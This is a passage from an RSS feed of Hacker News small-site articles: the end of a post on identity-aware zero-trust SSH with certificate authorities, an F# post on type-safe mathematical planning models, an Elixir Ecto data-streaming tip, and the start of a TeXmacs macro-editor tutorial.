Only inbound traffic with a valid client TLS ticket will be let through. Valid TLS client certificates will only ever be issued to users with a mycorp.com domain or the two contractor email addresses we specified.</span></p><h2 id="viewer-7tgjk"><span>Setting up an SSH session</span></h2><p id="viewer-4ckui"><span>Ok, time to test this and connect to this ssh service. Remember that we need a valid TLS client certificate. These are issued only with a valid token, and the token is only handed out to authorized users. To make all of this easier, we've extended the mysocketctl tool to take care of this workflow. The example below shows how we use the ssh ProxyCommand to make that easier for us, like this.</span></p><pre id="viewer-ealjl"><span>ssh ubuntu@crimson<span>-</span>thunder<span>-</span><span>8434.</span>edge<span>.</span>mysocket<span>.</span>io \
  <span>-</span>o <span>'ProxyCommand=mysocketctl client tls --host %h'</span></span></pre><p id="viewer-f19kv"><span>This will tell ssh to send all ssh traffic through this <em>mysocketctl client </em>command. This will start the authentication process, fetch the TLS client certificate for us, set up the TLS tunnel to the mysocket edge server, and transport the ssh traffic through this authenticated tunnel. The user can now log in to the ssh server using whatever method you‚Äôre used to.</span></p><p id="viewer-d6uat"><span>With this, we‚Äôve made our private ssh server accessible from the Internet, while the <strong><em>authenticating mysocket firewall</em></strong> is only allowing in session from client identities we approved beforehand. No VPN needed. Pretty cool, right?</span></p><h2 id="viewer-eb2c3"><span>Mysocket SSH Certificate authorities.</span></h2><div id="viewer-b9r2n"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets" data-pin-media="https://static.wixstatic.com/media/3b930f_8e04f5a076f144949126529b45666dca~mv2.png/v1/fit/w_586%2Ch_754%2Cal_c/file.png" src="https://static.wixstatic.com/media/3b930f_8e04f5a076f144949126529b45666dca~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-efkub"><span>SSH is quite similar to TLS in terms of workflow. It too supports authenticating users using signed certificates. </span></p><p id="viewer-ardlc"><span>
So we decided to expand on this functionality. In addition to an API endpoint that is responsible for signing TLS certificates, we also created one for signing SSH keys. </span></p><p id="viewer-ddpai"><span>If we build on the example above, the user can now, in addition to requesting a TLS client certificate, also request a signed SSH certificate. Our SSH certificate signing service will only sign the signing request if the user is authenticated and authorized, using the same logic as before.</span></p><h2 id="viewer-aacq7"><span>Setting up the server</span></h2><p id="viewer-54iu2"><span>In order to use this, we‚Äôll need to make a few minor changes to the SSH server. The configuration changes below are needed to enable authentication using CA keys.</span></p><pre id="viewer-2kmdr"><span>echo <span>"TrustedUserCAKeys /etc/ssh/ca.pub"</span> <span>&gt;&gt;</span><span>/</span>etc<span>/</span>ssh<span>/</span>sshd_config
echo <span>"AuthorizedPrincipalsFile %h/.ssh/authorized_principals"</span> <span>&gt;&gt;</span><span>/</span>etc<span>/</span>ssh<span>/</span>sshd_config
echo <span>"mysocket_ssh_signed"</span> <span>&gt;</span> <span>~</span>ubuntu<span>/</span><span>.</span>ssh<span>/</span>authorized_principals</span></pre><p id="viewer-109k2"><span>Finally, also make sure to get the Public key for the CA (<em>mysocketctl socket show)</em> and copy it into the ca.pub file (/etc/ssh/ca.pub).</span></p><p id="viewer-2bu8s"><span>Now the server is configured to work with and allow authentication based on signed SSH keys from the mysocket certificate authority. Note that all signed certificates will have two principles, the email address of the authenticated user, as well as ‚Äò<em>mysocket_ssh_signed</em>‚Äô. In the example configuration above, we told the server to map users with the principle ‚Äò<em>mysocket_ssh_signed</em>‚Äô to the local user ubuntu. </span></p><p id="viewer-68m6q"><span>Now we‚Äôre ready to connect, but instead of making the ssh command even longer, I‚Äôm going to add the following to my ssh config file ~/.ssh/config</span></p><pre id="viewer-1vb64"><span>Host <span>*</span><span>.</span>edge<span>.</span>mysocket<span>.</span>io
    ProxyCommand bash <span>-</span>c <span>'mysocketctl client ssh-keysign --host %h; ssh -tt -o IdentitiesOnly=yes -i ~/.ssh/%h %r@%h.mysocket-dummy &gt;&amp;2 &lt;&amp;1'</span>

Host <span>*</span><span>.</span>mysocket<span>-</span>dummy
    ProxyCommand mysocketctl client tls <span>--</span>host <span>%</span>h</span></pre><p id="viewer-5gufv"><span>The above will make sure that for all ssh sessions to *.edge.mysocket.io we start the authentication flow, fetch a TLS client certificate, and set up the TLS tunnel. We‚Äôll also submit an SSH key signing request, which will result in a short-lived signed SSH certificate that will be used for authenticating the SSH user.</span></p><p id="viewer-ct266"><span>Now the user can just SSH like this, and the whole workflow will kick-off.</span></p><pre id="viewer-9bo6g"><span>ssh ubuntu@crimson<span>-</span>thunder<span>-</span><span>8434.</span>edge<span>.</span>mysocket<span>.</span>io</span></pre><p id="viewer-300rj"><span>For those interested, the ssh certificate will end up in your ~/.ssh/ directory and will look something like this.</span></p><pre id="viewer-bs1lt"><span>$ ssh-keygen -Lf ~/.ssh/nameless-thunder-8896.edge.mysocket.io-cert.pub
/Users/andreetoonk/.ssh/nameless-thunder-8896.edge.mysocket.io-cert.pub:
        Type: <a href="mailto:ecdsa-sha2-nistp256-cert-v01@openssh.com" target="_blank" rel="noopener">ecdsa-sha2-nistp256-cert-v01@openssh.com</a> user certificate
        Public key: ECDSA-CERT SHA256:0u6TICEhrISMCk7fbwBi629In9VWHaDG1IfnXoxjwlg
        Signing CA: ECDSA SHA256:MEdE6L0TUS0ZZPp1EAlI6RZGzO81A429lG7+gxWOonQ (using ecdsa-sha2-nistp256)
        Key ID: "<a href="mailto:atoonk@gmail.com" target="_blank" rel="noopener">atoonk@gmail.com</a>"
        Serial: 5248869306421956178
        Valid: from 2021-02-13T12:15:20 to 2021-02-13T12:25:20
<strong>        Principals:
                atoonk@gmail.com
                mysocket_ssh_signed</strong>
        Critical Options: (none)
        Extensions:
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc</span></pre><p id="viewer-8jf8b"><span>With this, users can SSH to the same server as before, but the cool thing is that the server won‚Äôt need to know any traditional known credentials for its users. Things like passwords or a public key entry in the authorized_keys file belong to the past. Instead, with the help of <em>mysocketctl</em>, the user will present a short-lived signed ssh certificate, which the server will trust.</span></p><p id="viewer-d3l5j"><span>With this, we achieved true Single Sign-on (SSO) for your SSH servers. Since the certificates are ‚Ä¶</span></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets">https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets</a></em></p>]]>
            </description>
            <link>https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182574</guid>
            <pubDate>Thu, 18 Feb 2021 17:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Love F# for Mathematical Planning]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26182563">thread link</a>) | @dunefox
<br/>
February 18, 2021 | https://matthewcrews.com/blog/2020-12-09-why-i-love-fsharp-for-mathematical-planning/ | <a href="https://web.archive.org/web/*/https://matthewcrews.com/blog/2020-12-09-why-i-love-fsharp-for-mathematical-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article>
   

  <div>
<blockquote>
<p>A designer knows he has achieved perfection not when there is nothing left to add, but when there is nothing left to take away</p>
<ul>
<li>Antoine de Saint-Exupery</li>
</ul>
</blockquote>
<p>On my journey of growing as a developer, I am consistently inspired by language features which seem incredibly simple but yield remarkable benefit. As I try to master F#, I am frequently surprised by how powerful the language is for expressing ideas while having so few features. Discussions frequently pop up about the need for ever more powerful abstractions, yet I find myself amazed by how far you can take the language with what is already there.</p>
<p>I am no programming language expert, but I admire languages that maintain a lean feature set. Every new feature added to a language makes it just a little bit more difficult to fully understand and a little more intimidating for new developers. It is an impressive design feat when a language can remain approachable for beginners but enable the flexibility that library authors need.</p>
<p>I am an Industrial Engineering turned Machine Learning Engineer, and I focus on the problem of maximizing the profitability and efficiency of companies. Often the solution involves a Mathematical Planning Model (aka Mathematical Programming). What I hope to do in the next few paragraphs is illustrate to you how some of the most basic features of F#, Discriminated Unions and Units of Measure, eliminate the most pernicious bugs when developing these models.</p>
<h2 id="the-domain-of-mathematical-planning">The Domain of Mathematical Planning</h2>
<p>The domain of Mathematical Planning is made up of Decisions, Constraints, and Objectives. A Decision is a choice that a business needs to make. It can be how many of Item X do we buy, do we build in Location A or Location B, or how many people do we assign to each job. Constraints are the rules we need to abide by. They are the limitations on what is possible. A Constraint could be that we only have 10 people available, or we can only build in Seattle or Portland, or we only have $1,000,000 to invest. The Objective is how we measure success. It is the function we want to maximize or minimize. We could minimize waste, maximize profit, or minimize cost.</p>
<p>Many of my colleagues are building their models with Python. Python is a great language and I have been productive with it in the past. Here is a snippet of what a mathematical planning model may look like in Python:</p>
<div><pre><code data-lang="python"><span># Define a list of items to optimize for</span>
items <span>=</span> [<span>"A"</span>, <span>"B"</span>, <span>"C"</span>]

<span># Define a list of locations to assign items to</span>
locations <span>=</span> [<span>"Portland"</span>, <span>"Seattle"</span>, <span>"Detroit"</span>]

<span># Define a dictionary of revenue associated with each item and location tuple</span>
revenue <span>=</span> {(<span>"A"</span>,<span>"Portland"</span>):<span>1.5</span>;, (<span>"A"</span>,<span>"Seattle"</span>):<span>1.7</span> <span>...</span> }

<span># Define a dictionary with the availability of each item</span>
availability <span>=</span> {<span>"A"</span>:<span>10.0</span>, <span>"B"</span>:<span>20.0</span>, <span>"C"</span>:<span>14.0</span>}

<span># Create a Decision for each Item, Location combination. This will be how much</span>
<span># of a given item we decide to send to that location</span>
allocation <span>=</span> LpVariable<span>.</span>dicts(<span>"AmountSent"</span>,(items,locations), <span>0</span>)

<span># Create an instance of a `Problem` object and state that we want to maximize</span>
<span># the objective we give it</span>
problem <span>=</span> LpProblem(<span>"ItemAllocation"</span>, LpMaximize)

<span># We create an expression which evaluates the total revenue</span>
revenue_expr <span>=</span>
    lpSum([revenue[i][l] <span>*</span> allocation[i][l] <span>for</span> i <span>in</span> items <span>for</span> l <span>in</span> locations])

<span># We set the Objective of the Problem by adding it</span>
problem <span>+=</span> revenue_expr, <span>"MaximizeRevenue"</span>

<span># For each item in items, create a constraint which states that the total number</span>
<span># of items that is allocated cannot exceed the availability of the item</span>
<span>for</span> i <span>in</span> items:
    problem <span>+=</span> lpSum([allocation[l][i] <span>for</span> l <span>in</span> location] <span>&lt;=</span> availability[i])

</code></pre></div><p>This is the beginning of a straightforward assignment problem. We have a list of items, <code>items</code>. For each <code>item</code> in <code>items</code>, we must decide how many we send to each <code>location</code> in <code>locations</code>. There is a limit on how much of each <code>item</code> is available for us to send. There is a revenue associated with sending a particular <code>item</code> to a given <code>location</code>. In this problem we want to maximize our revenue which is calculated by multiplying the <code>decision</code> for a given <code>item</code> and <code>location</code> by the <code>revenue</code> associated with it. Finally, we create a constraint for each <code>item</code> in <code>items</code> which states that the total number of a given <code>item</code> that is allocated cannot exceed the total that is available.</p>
<p>This is only part of the problem. Normally there would be more constraints that would make it more interesting. This is enough of a problem to illustrate my case though. There are two errors in this model already. If you were paying close attention you may have found one. I promise you cannot detect the second.</p>
<h2 id="the-power-of-domain-modeling-using-discriminated-unions">The Power of Domain Modeling Using Discriminated Unions</h2>
<p>F# provides two simple but powerful features which help ensure against the errors in the Python code. The first is Discriminated Unions. If we were to reformulate this problem using F#, the first thing we would do was define some simple types to model our domain.</p>
<div><pre><code data-lang="fsharp"><span>type</span> <span>Item</span> <span>=</span> Item <span>of</span> <span>string</span>
<span>type</span> <span>Location</span> <span>=</span> Location <span>of</span> <span>string</span>
</code></pre></div><p>Instead of just using strings to describe our Items and Locations, we create simple, single case Discriminated Unions (DU). These DUs provide context around what the strings are meant to represent. Let‚Äôs go ahead and create our <code>item</code> and <code>locations</code> lists again. This time, wrapping them in DUs.</p>
<div><pre><code data-lang="fsharp"><span>let</span> items <span>=</span> 
  <span>[</span><span>"A"</span><span>;</span> <span>"B"</span><span>;</span> <span>"C"</span><span>]</span> 
  <span>|&gt;</span> List.map Item

<span>let</span> locations <span>=</span> 
  <span>[</span><span>"Portland"</span><span>;</span> <span>"Seattle"</span><span>;</span> <span>"Detroit"</span><span>]</span>
  <span>|&gt;</span> List.map Location
</code></pre></div><p>We will also update our <code>availability</code> information to use these new types.</p>
<div><pre><code data-lang="fsharp"><span>let</span> availability <span>=</span>
    <span>[</span>
        Item <span>"A"</span><span>,</span> 10<span>.</span>0
        Item <span>"B"</span><span>,</span> 20<span>.</span>0
        Item <span>"C"</span><span>,</span> 14<span>.</span>0
    <span>]</span> <span>|&gt;</span> Map
</code></pre></div><p>We will create the Decisions for each <code>item</code> and <code>location</code>. We store these <code>Decision</code> types in a <code>Map</code> which is indexed by an <code>(Item * Location)</code> tuple.</p>
<div><pre><code data-lang="fsharp"><span>let</span> allocation <span>=</span>
    DecisionBuilder<span>&lt;</span>Servings<span>&gt;</span> <span>"AmountSent"</span> <span>{</span>
        <span>for</span> i <span>in</span> items <span>do</span>
            <span>for</span> l <span>in</span> locations <span>-&gt;</span>
                Continuous <span>(</span>0<span>.</span>0<span>,</span> infinity<span>)</span>
    <span>}</span> <span>|&gt;</span> Map
</code></pre></div><p>We now attempt to create the same constraints we did in Python with a direct translation.</p>
<div><pre><code data-lang="fsharp"><span>let</span> allocationContraints <span>=</span>
    ConstraintBuilder <span>"ItemLimit"</span> <span>{</span>
        <span>for</span> i <span>in</span> items <span>-&gt;</span>
            List.sum <span>[</span><span>for</span> l <span>in</span> locations <span>-&gt;</span> 1<span>.</span>0 <span>*</span> allocation<span>.[</span>l<span>,</span> i<span>]]</span> <span>&lt;==</span> availability<span>.[</span>i<span>]</span>
    <span>}</span>   
</code></pre></div><p>Except, the compiler is gives us an error on the indexing of <code>allocation</code>.</p>
<p><img src="https://matthewcrews.com/img/2020-12-08-indexing-error.png" alt="Compiler error for indexing Map"></p>
<p>What some of you may have noticed in the Python code is that the <code>allocation</code> collection is indexed by an <code>Item</code> then <code>Location</code>. The original code was trying to access it by <code>location</code> then by <code>item</code>. This would have thrown an error at runtime due to a missing value. In F# this becomes a compiler error. The type system itself it is helping you. This may seem small, but this is one of the most painful types of errors when debugging a Mathematical Planning model.</p>
<p>Someone may say that this can be accomplished in other languages and I would agree. I believe where F# is unique is in the simplicity and ease of using single case Discriminated Unions for wrapping primitives. It is virtually no additional effort.</p>
<h2 id="units-of-measure-the-achilles-heel-of-numbers">Units of Measure: The Achilles Heel of Numbers</h2>
<p>There is an underappreciated problem in software development, numbers are rarely just numbers. They represent something: <code>cm</code>, <code>feet</code>, <code>kg</code>, or <code>meters</code>. Normally we do not care about a raw number. Our primary concern is with what the number represents. In most languages there are no easy mechanisms for tracking the Units of Measure associated with a number. F# on the other hand has baked the concept of a Unit of Measure into the type system.</p>
<p>The Units of Measure feature will reveal the second problem with the Python code that otherwise may remain undetected. Let‚Äôs update our domain with some new types to track the units on our numbers.</p>
<div><pre><code data-lang="fsharp"><span>[&lt;</span>Measure<span>&gt;]</span> <span>type</span> <span>Servings</span>
<span>[&lt;</span>Measure<span>&gt;]</span> <span>type</span> <span>Kg</span>
</code></pre></div><p>We now have units to represent <code>Servings</code> and <code>Kg</code>. Let‚Äôs update our <code>availability</code> collection to store numbers with these units attached.</p>
<div><pre><code data-lang="fsharp"><span>let</span> availability <span>=</span>
    <span>[</span>
        Item <span>"A"</span><span>,</span> 10<span>.</span>0<span>&lt;</span>Kg<span>&gt;</span>
        Item <span>"B"</span><span>,</span> 20<span>.</span>0<span>&lt;</span>Kg<span>&gt;</span>
        Item <span>"C"</span><span>,</span> 14<span>.</span>0<span>&lt;</span>Kg<span>&gt;</span>
    <span>]</span> <span>|&gt;</span> Map
</code></pre></div><p>We have now provided more context around our availability numbers. We now know they are stored in units of <code>Kg</code>. The F# compiler will enforce correct algebra as we work with them. We now update our Decisions to be in units of <code>Servings</code>.</p>
<div><pre><code data-lang="fsharp"><span>let</span> allocation <span>=</span>
    DecisionBuilder<span>&lt;</span>Servings<span>&gt;</span> <span>"AmountSent"</span> <span>{</span>
        <span>for</span> i <span>in</span> items <span>do</span>
            <span>for</span> l <span>in</span> locations <span>-&gt;</span>
                Continuous <span>(</span>0<span>.</span>0<span>&lt;</span>Servings<span>&gt;,</span> 1_000_000<span>.</span>0<span>&lt;</span>Servings<span>&gt;)</span>
    <span>}</span> <span>|&gt;</span> Map
</code></pre></div><p>With our Decisions updated, we go back to our constraint definition and we now see a new bug.</p>
<p><img src="https://matthewcrews.com/img/2020-12-08-units-of-measure-mismatch.png" alt="Units of Measure Mismatch"></p>
<p>The important part of this message is at the bottom. The compiler is complaining that the left-hand is in units of <code>Servings</code> and the right-hand side is in units of <code>Kg</code>. It does not make sense to compare values that are in different units, so the compiler is throwing an error. In other languages this error would go undetected. Worse, it may not even be caught in unit testing because the math will still work, it just won‚Äôt give correct results.</p>
<p>Let‚Äôs go ahead and add some conversion data so that we can fix this.</p>
<div><pre><code data-lang="fsharp"><span>let</span> itemMass <span>=</span>
    <span>[</span>
        Item <span>"A"</span><span>,</span> 1<span>.</span>1<span>&lt;</span>Kg<span>/</span>Servings<span>&gt;</span>
        Item <span>"B"</span><span>,</span> 2<span>.</span>0<span>&lt;</span>Kg<span>/</span>Servings<span>&gt;</span>
        Item <span>"C"</span><span>,</span> 0<span>.</span>7<span>&lt;</span>Kg<span>/</span>Servings<span>&gt;</span>
    <span>]</span> <span>|&gt;</span> Map
</code></pre></div><p>We now have data which will allow us to convert from <code>Serving</code> to <code>Kg</code>. Let‚Äôs incorporate it into our constraint creation expression.</p>
<div><pre><code data-lang="fsharp"><span>let</span> allocationContraints <span>=</span>
  ConstraintBuilder <span>"ItemLimit"</span> <span>{</span>
    <span>for</span> i <span>in</span> items <span>-&gt;</span>
      List.sum <span>[</span><span>for</span> l <span>in</span> locations <span>-&gt;</span> itemMass<span>.[</span>i<span>]</span> <span>*</span> itemAllocation<span>.[</span>i<span>,</span> l<span>]]</span> <span>&lt;==</span> availability<span>.[</span>i<span>]</span>
  <span>}</span> 
</code></pre></div><p>Now the compiler is happy because the units are in <code>Kg</code> on both sides. This simple feature of ensuring correct Units of Measure eliminates what is possibly the most nefarious bug in Mathematical Planning. It would be hard to calculate the number of hours wasted on badly formulated models due to mismatched Units of Measure.</p>
<h2 id="simple-building-blocks">Simple Building Blocks</h2>
<p>F# is an incredibly expressive language while staying lean on the number of features. Other languages have taken the approach of throwing every possible feature in. F# is relatively slow to ‚Ä¶</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://matthewcrews.com/blog/2020-12-09-why-i-love-fsharp-for-mathematical-planning/">https://matthewcrews.com/blog/2020-12-09-why-i-love-fsharp-for-mathematical-planning/</a></em></p>]]>
            </description>
            <link>https://matthewcrews.com/blog/2020-12-09-why-i-love-fsharp-for-mathematical-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182563</guid>
            <pubDate>Thu, 18 Feb 2021 17:16:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to process large amounts of data in Elixir with Ecto]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26182276">thread link</a>) | @todsacerdoti
<br/>
February 18, 2021 | https://mkaszubowski.com/2021/02/16/ecto-repo-stream-data-processing.html | <a href="https://web.archive.org/web/*/https://mkaszubowski.com/2021/02/16/ecto-repo-stream-data-processing.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  <p><strong>This is not a post about Big Data.</strong> This is about datasets that are
too big to handle entirely in-memory but too small to justify spending a few
hours writing a custom data pipeline.</p>

<p>Here is an easy way to deal with data that should take up to a few hours to
process:</p>

<div><div><pre><code><span>Repo</span><span>.</span><span>transaction</span><span>(</span><span>fn</span> <span>-&gt;</span>
  <span>YourSchema</span>
  <span>|&gt;</span> <span>order_by</span><span>(</span><span>asc:</span> <span>:inserted_at</span><span>)</span>
  <span>|&gt;</span> <span>any_query</span><span>()</span>
  <span>|&gt;</span> <span>Repo</span><span>.</span><span>stream</span><span>()</span>
  <span>|&gt;</span> <span>Stream</span><span>.</span><span>map</span><span>(</span><span>fn</span> <span>user</span> <span>-&gt;</span> <span>any_transformation</span><span>(</span><span>user</span><span>)</span> <span>end</span><span>)</span>
  <span>|&gt;</span> <span>Stream</span><span>.</span><span>filter</span><span>(</span><span>&amp;</span><span>any_filter</span><span>/</span><span>1</span><span>)</span>
  <span>|&gt;</span> <span>Stream</span><span>.</span><span>each</span><span>(</span><span>fn</span> <span>user</span> <span>-&gt;</span> <span>do_something_with_user</span><span>(</span><span>user</span><span>)</span> <span>end</span><span>)</span>
  <span>|&gt;</span> <span>Stream</span><span>.</span><span>run</span><span>()</span>
<span>end</span><span>,</span> <span>timeout:</span> <span>:infinity</span><span>)</span>
</code></pre></div></div>



<ul>
  <li><code>Repo.stream/1</code> has to be used inside a transaction for both PostgreSQL and
MySQL. It queries the DB in chunks (the default chunk size is 500 rows.)</li>
  <li>We‚Äôre passing <code>timeout: :infinity</code> to <code>Repo.transaction/2</code> to allow it to run
as long as it needs. <a href="https://hexdocs.pm/ecto/Ecto.Repo.html#module-shared-options">The default is 15
seconds</a>, after
which the transaction times out.</li>
  <li>Streaming the results will block one of the connections from Ecto‚Äôs connection pool, so watch out for that if your connection pool size is small.</li>
  <li>Since it‚Äôs run in a transaction, rows added after the function starts won‚Äôt be
read. You can re-run the script adding a <code>where</code> clause with a timestamp to
synchronise those entries.</li>
  <li>Since <code>Repo.stream</code> returns an Elixir stream, you have to use <code>Stream</code> module instead of <code>Enum</code>.
You can use <code>Stream</code> instead of <code>Enum</code> for most of what you‚Äôd typically need.
Just use <a href="https://hexdocs.pm/elixir/Stream.html#run/1">Stream.run/1</a> at the end to actually run the
processing.</li>
  <li>Before you run the function on the entire dataset, you can easily add <code>|&gt;
limit(10)</code> clause to your query and test if processing is correct.</li>
</ul>

<h2 id="example-use-cases">Example use cases</h2>

<ul>
  <li>Migrate the data from one table to another.</li>
  <li>Migrate the data to another database (for example: build an initial index in
ElasticSearch).</li>
  <li>Export the data to a CSV file.</li>
  <li>Fill missing values for old data (after adding a new column).</li>
  <li>Any manual, one-time task you might want to do for some data.</li>
</ul>

<h2 id="alternative-approaches">Alternative approaches</h2>

<ul>
  <li>If you only need CSV and don‚Äôt need to do any in-memory transformations, <a href="https://www.postgresqltutorial.com/export-postgresql-table-to-csv-file/">you
can export data from PostgreSQL
directly</a>
using the <code>COPY</code> statement. You can import data from CSV, too.</li>
  <li>If you want to make the processing parallel, take a look at
<a href="https://github.com/dashbitco/flow">Flow</a> (or
<a href="https://github.com/elixir-lang/gen_stage">GenStage</a>)</li>
</ul>

<h2 id="references">References:</h2>

<ul>
  <li><a href="https://hexdocs.pm/ecto/Ecto.Repo.html#c:stream/2">https://hexdocs.pm/ecto/Ecto.Repo.html#c:stream/2</a></li>
  <li><a href="https://hexdocs.pm/elixir/Stream.html">https://hexdocs.pm/elixir/Stream.html</a></li>
</ul>

  <hr>
</div></div>]]>
            </description>
            <link>https://mkaszubowski.com/2021/02/16/ecto-repo-stream-data-processing.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182276</guid>
            <pubDate>Thu, 18 Feb 2021 16:57:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TeXmacs: The Macro editor and easy macro modification]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26182251">thread link</a>) | @amichail
<br/>
February 18, 2021 | https://texmacs.github.io/notes/docs/macro-editor.html | <a href="https://web.archive.org/web/*/https://texmacs.github.io/notes/docs/macro-editor.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    
    
    
    <p>
      The TeXmacs editor offers the possibility of examining and modifying
      macro definitions through a ‚Äúshortcut‚Äù tool, without having
      to know in which style file or package they are defined. 
    </p>
    <p>
      The tool is called ‚ÄúMacro editor‚Äù, and the modifications
      made via the Macro editor are saved in the preamble of the current
      document, while original definitions of macros are preserved in their
      respective files. The Macro editor can be used as well to write up a new
      macro starting from an existing macro.
    </p>
    <p>
      Let us examine two examples. 
    </p>
    <h2 id="auto-2">1.<span></span>Colored todo notes<span></span></h2>
    <p>
      TeXmacs has a <span>todo</span> macro which typesets its
      arguments (a reminder to self, let's say) with red font on a light red
      background, surrounded by brackets: <span color="#800000">[write a helpful blog
      post]</span>.
    </p>
    <p>
      Let us see how to change the macro to have colored notes in different
      colors. The Macro editor is accessible from macro applications
      themselves, so we insert a <span>todo</span> macro by typing <tt>\todo</tt> obtaining a red ‚Äútodo‚Äù field: <span color="#800000">[]</span>.
      With the cursor inside the (already typeset) macro field, a button that
      invokes the Macro editor becomes available in the TeXmacs tool ribbons;
      in Figure <a href="#fig:macro-editor-wrench">1</a> we highlight the ‚Äúwrench‚Äù button.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-1.The%20macro%20editor%2001%20-%20edited.png" width="562.33568"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 1. </b><a id="auto-3"></a>The Macro editor appears among the
              tools as the wrench icon <img src="https://texmacs.github.io/notes/docs/macro-editor-2.tm_focus_prefs.png" height="14.058392" width="14.058392">
              when the cursor is in a macro field (the icon is in this figure
              highlighted and connected to the macro with the arrow).<a id="fig:macro-editor-wrench"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      Clicking on the wrench button a menu appears, and we select ‚ÄúEdit
      macro‚Äù (Figure <a href="#fig:macro-edit-menu">2</a>); selecting ‚ÄúEdit
      source‚Äù would bring us to the location (package or style file)
      where the macro is defined.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-3.The%20macro%20editor%2002%20-%20edited.png" width="562.33568"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 2. </b><a id="auto-4"></a>The macro editing
              (‚Äúwrench‚Äù) menu.<a id="fig:macro-edit-menu"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      Clicking on ‚ÄúEdit macro‚Äù brings up the ‚ÄúEdit
      macro‚Äù window, the protagonist of this blog post (Figure <a href="#fig:macro-editor-window">3</a>).
      Let us ignore in this blog post the menu items <a id="auto-5"></a> and <a id="auto-6"></a>, which would also allow a customization of the
      macro but do not have the general applicability of the macro editor.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-4.The%20macro%20editor%2003.png" height="345.8364432" width="565.1473584"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 3. </b><a id="auto-7"></a>The Macro editor window.<a id="fig:macro-editor-window"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      The first view is the ‚Äútext view‚Äù, where the macro is
      represented in typeset form (as in the text mode of TeXmacs); in this
      case it results in a <span>todo</span> note which displays the
      name of the variable in the macro definition (<span color="#800000">[body]</span>).
      We are interested in the source so we select ‚ÄúSource‚Äù from
      the drop-down menu at the bottom left (Figure <a href="#fig:macro-text-mode">4</a>).
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-5.The%20macro%20editor%2004%20-%20edited.png" width="562.33568"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 4. </b><a id="auto-8"></a>The <span>todo</span> macro
              in text mode inside the Macro editor.<a id="fig:macro-text-mode"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      The macro now is represented in source mode and we can edit it (Figure
      <a href="#fig:macro-source-mode">5</a>).
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-6.The%20macro%20editor%2005.png" width="562.33568"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 5. </b><a id="auto-9"></a>The <span>todo</span> macro
              in source mode inside the Macro editor.<a id="fig:macro-source-mode"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      We would like to have green <span>todo</span> notes. We identify
      tentatively the two variables <span color="#008000"><i>todo-color</i></span> and
      <span color="#008000"><i>todo-bg-color</i></span> as the color of the text and
      the color of the background‚Äîit looks reasonable, and if this does
      not work, we can check how the macro <span>render-todo</span> is
      composed (in TeXmacs 1.99.18, which I am using to write this blog post,
      a bug prevents one to do this for the macro <span>render-todo</span>
      through the macro editor‚Äîthe attempt makes TeXmacs crash‚Äîso
      if you want to check that macro please use the <a id="auto-10"></a> entry of the ‚Äúwrench‚Äù menu and the
      file <tt>std-markup.ts</tt> will open at the position of the code
      for <span>render-macro</span>; the discussion of the <span>todo</span>
      example works despite this bug).
    </p>
    <p>
      We can check the values of the environment variables (see <a href="https://www.texmacs.org/tmweb/manual/webman-env.en.html">Standard
      environment variables</a> for a general discussion of the environment
      variables ) by typing them preceded by a backslash and pressing <span>Return</span> (for this we can either switch out of the
      macro editor and use the usual TeXmacs editor or we can set the macro
      editor to Text mode): <span color="#008000"><i>todo-color</i></span> evaluates to
      dark red and <span color="#008000"><i>todo-bg-color</i></span> to pastel red. Let
      us then substitute dark green and pastel green for them.
    </p>
    <p>
      To type our new text in place of either <span color="#008000"><i>todo-color</i></span>
      or <span color="#008000"><i>todo-bg-color</i></span>, we first click
      <strong>four</strong> times onto it to select its name and the
